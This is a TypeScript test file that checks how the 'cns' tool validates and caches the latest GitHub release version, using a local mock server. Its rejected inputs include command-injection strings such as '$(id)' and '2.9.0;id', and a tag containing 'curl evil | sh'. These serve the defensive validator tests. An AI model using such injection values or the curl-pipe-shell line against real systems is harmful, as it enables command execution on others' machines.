import assert from "node:assert/strict";
import { mkdtemp, readFile, realpath, rm, stat, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test, { type TestContext } from "node:test";
import { knownLatestRelease, latestRelease, releaseVersion } from "./releases.js";

/** A stand-in for GitHub's latest-release API, and a configuration directory of the test's own for what cns remembers of it. */
async function github(t: TestContext) {
  const served = { tag: "v2.9.0" as unknown, status: 200, asked: 0 };
  const server = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: () => { served.asked++; return Response.json({ tag_name: served.tag }, { status: served.status }); } });
  const dir = await realpath(await mkdtemp(path.join(os.tmpdir(), "cns-releases-")));
  const previous = { CNS_RELEASES: process.env.CNS_RELEASES, CNS_CONFIG_DIR: process.env.CNS_CONFIG_DIR };
  process.env.CNS_RELEASES = `http://127.0.0.1:${server.port}/latest`;
  process.env.CNS_CONFIG_DIR = dir;
  t.after(async () => {
    server.stop(true);
    for (const [name, value] of Object.entries(previous)) { if (value === undefined) delete process.env[name]; else process.env[name] = value; }
    await rm(dir, { recursive: true, force: true });
  });
  const cache = path.join(dir, "latest-release.json");
  return { served, server, cache, saved: async () => JSON.parse(await readFile(cache, "utf8")) as { version?: string; checkedAt: number } };
}

test("only a plain X.Y.Z release goes on another device's command line", () => {
  for (const version of ["2.9.0", "10.0.12", "0.0.1"]) assert.equal(releaseVersion(version), version);
  for (const version of ["v2.9.0", "2.9", "2.9.0-rc.1", "2.9.0 ", "2.9.0\n", "2.9.0;id", "2.9.0' ; id ; '", "$(id)", "2.9.0&calc", "٢.٩.٠", "", 290, undefined]) {
    assert.equal(releaseVersion(version), undefined, JSON.stringify(version));
  }
});

test("the latest release is the tag GitHub names, refused unless it is vX.Y.Z, and unknown when it cannot be had", async (t) => {
  const { served, server, saved, cache } = await github(t);
  assert.equal(await latestRelease(), "2.9.0");
  // What GitHub said is kept privately, for cns peers.
  assert.equal((await saved()).version, "2.9.0");
  if (process.platform !== "win32") assert.equal((await stat(cache)).mode & 0o777, 0o600);
  served.tag = "v2.9.0; curl evil | sh";
  await assert.rejects(latestRelease(), /the latest release is not named vX\.Y\.Z: v2\.9\.0; curl evil/);
  served.tag = undefined;
  await assert.rejects(latestRelease(), /not named vX\.Y\.Z/);
  served.status = 403;
  const before = (await saved()).checkedAt;
  await assert.rejects(latestRelease(), /cannot ask GitHub: GitHub answered 403/);
  // That it asked is kept too, beside the last release GitHub named.
  assert.equal((await saved()).version, "2.9.0");
  assert.ok((await saved()).checkedAt >= before);
  server.stop(true);
  await assert.rejects(latestRelease(), /cannot ask GitHub/);
  process.env.CNS_RELEASES = "off";
  await assert.rejects(latestRelease(), /CNS_RELEASES is off/);
});

test("cns peers goes by what this device learned of the latest release within a day, and asks GitHub at most once a day", async (t) => {
  const { served, cache, saved } = await github(t);
  assert.equal(await knownLatestRelease(), "2.9.0");
  assert.equal(served.asked, 1);
  served.tag = "v3.0.0";
  assert.equal(await knownLatestRelease(), "2.9.0", "within a day, what it learned");
  assert.equal(served.asked, 1);

  // A day later it asks again; when GitHub fails, the last release it named stands, and it does not ask again that day.
  const day = 24 * 60 * 60_000;
  await writeFile(cache, JSON.stringify({ version: "2.9.0", checkedAt: Date.now() - day - 1000 }));
  served.status = 500;
  assert.equal(await knownLatestRelease(), "2.9.0");
  assert.equal(served.asked, 2);
  assert.equal((await saved()).version, "2.9.0");
  served.status = 200;
  assert.equal(await knownLatestRelease(), "2.9.0");
  assert.equal(served.asked, 2);
  // With none named yet, it says nothing.
  await writeFile(cache, JSON.stringify({ checkedAt: Date.now() - day - 1000 }));
  served.status = 500;
  assert.equal(await knownLatestRelease(), undefined);
  assert.deepEqual(Object.keys(await saved()), ["checkedAt"]);
  assert.equal(served.asked, 3);
  served.status = 200;

  // What it reads back is checked as what GitHub says is; a time to come is no time it asked.
  await writeFile(cache, JSON.stringify({ version: "9.9.9; id", checkedAt: Date.now() }));
  assert.equal(await knownLatestRelease(), undefined);
  await writeFile(cache, JSON.stringify({ version: "9.9.9", checkedAt: Date.now() + day }));
  assert.equal(await knownLatestRelease(), "3.0.0");
  await writeFile(cache, "not json");
  assert.equal(await knownLatestRelease(), "3.0.0");
  assert.equal(served.asked, 5);

  // Off: neither asked nor read.
  process.env.CNS_RELEASES = "off";
  assert.equal(await knownLatestRelease(), undefined);
  assert.equal(served.asked, 5);
});
